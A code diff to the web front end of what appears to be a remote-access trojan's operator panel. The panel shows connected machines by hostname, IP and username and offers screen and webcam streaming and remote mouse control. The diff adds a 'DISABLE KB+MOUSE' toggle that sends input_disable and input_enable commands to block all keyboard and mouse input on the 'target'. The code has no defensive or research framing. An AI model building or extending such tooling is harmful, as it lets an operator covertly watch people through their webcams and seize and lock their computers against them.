@@ -311,6 +311,9 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
           <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--dim);cursor:pointer;">
             <input type="checkbox" id="remote-ctrl-toggle" onchange="toggleRemoteCtrl(this.checked)"> REMOTE CTRL
           </label>
+          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--danger);cursor:pointer;" title="Block all keyboard and mouse input on target">
+            <input type="checkbox" id="disable-input-toggle" onchange="toggleDisableInput(this.checked)"> DISABLE KB+MOUSE
+          </label>
           <span class="stream-status" id="stream-status">IDLE</span>
         </div>
       </div>
@@ -730,12 +733,17 @@ function openNode(id){
   document.getElementById('modal-title').textContent = selectedClient.hostname.toUpperCase();
   document.getElementById('modal-subtitle').textContent = selectedClient.ip+' · '+selectedClient.username;
   document.getElementById('modal-overlay').classList.add('open');
+  // Reset input-disable checkbox whenever a new node is opened
+  document.getElementById('disable-input-toggle').checked = false;
   switchTab('screen');
 }
 function closeModal(){
   document.getElementById('modal-overlay').classList.remove('open');
   if(streaming) stopStream();
   if(webcamStreaming) stopWebcam();
+  // If input was disabled, re-enable it when we close the modal
+  const cb = document.getElementById('disable-input-toggle');
+  if(cb.checked){ cb.checked=false; if(selectedClient) sendCmdRaw('input_enable'); }
 }
 document.getElementById('modal-overlay').addEventListener('click',e=>{ if(e.target===document.getElementById('modal-overlay')) closeModal(); });
 document.querySelectorAll('.tab-btn').forEach(btn=>btn.addEventListener('click',()=>switchTab(btn.dataset.tab)));
@@ -770,6 +778,26 @@ function toggleRemoteCtrl(on){
   const img=document.getElementById('screen-img');
   if(on){ img.addEventListener('mousemove',onRMM); img.addEventListener('click',onRMC); img.addEventListener('contextmenu',onRRC); }
   else { img.removeEventListener('mousemove',onRMM); img.removeEventListener('click',onRMC); img.removeEventListener('contextmenu',onRRC); }
+}
+
+async function toggleDisableInput(on){
+  if(!selectedClient){
+    document.getElementById('disable-input-toggle').checked=false;
+    return;
+  }
+  const action = on ? 'input_disable' : 'input_enable';
+  const label = document.getElementById('disable-input-toggle').closest('label');
+  label.style.opacity='0.5';
+  const res = await sendCmdRaw(action);
+  label.style.opacity='1';
+  if(res.status==='ok'){
+    addLog((on?'⛔ Input disabled':'✅ Input re-enabled')+' on '+selectedClient.hostname, on?'error':'connect');
+    // Keep checkbox state in sync with result
+  } else {
+    addLog('Input toggle failed: '+(res.msg||'unknown'),'error');
+    // Revert checkbox on failure
+    document.getElementById('disable-input-toggle').checked=!on;
+  }
 }
 function getImgXY(e){ const r=e.target.getBoundingClientRect(); return{x:Math.round(e.clientX-r.left),y:Math.round(e.clientY-r.top)}; }
 function onRMM(e){ if(!streaming||!selectedClient)return; socket.emit('mouse_move',{client_id:selectedClient.id,...getImgXY(e)}); }
